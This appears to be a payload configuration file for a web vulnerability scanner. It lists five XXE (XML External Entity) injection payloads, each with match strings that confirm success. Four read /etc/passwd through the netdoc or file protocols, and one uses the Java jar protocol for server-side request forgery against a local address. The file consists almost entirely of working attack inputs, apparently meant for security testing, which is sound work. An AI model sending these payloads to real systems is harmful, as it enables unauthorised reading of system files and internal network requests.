; rules = lol

; Netdoc protocol (Java)
[java_netdoc_passwd]
payload = <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "netdoc:///etc/passwd">]><foo>&xxe;</foo>
rules = root:x:0:
    root:*:0:0

; Jar protocol (Java) - for SSRF
[java_jar_ssrf]
payload = <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "jar:http://127.0.0.1:8080/test.jar!/test.txt">]><foo>&xxe;</foo>
rules = PK

; File protocol variations
[file_protocol_triple_slash]
payload = <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:////etc/passwd">]><foo>&xxe;</foo>
rules = root:x:0:
    root:*:0:0

; Compact XXE payload
[compact_xxe]
payload = <?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
rules = root:x:0:
    root:*:0:0

; XXE with data element
[data_element_xxe]
payload = <?xml version="1.0"?><!DOCTYPE data [<!ELEMENT data (#ANY)><!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>
rules = root:x:0:
    root:*:0:0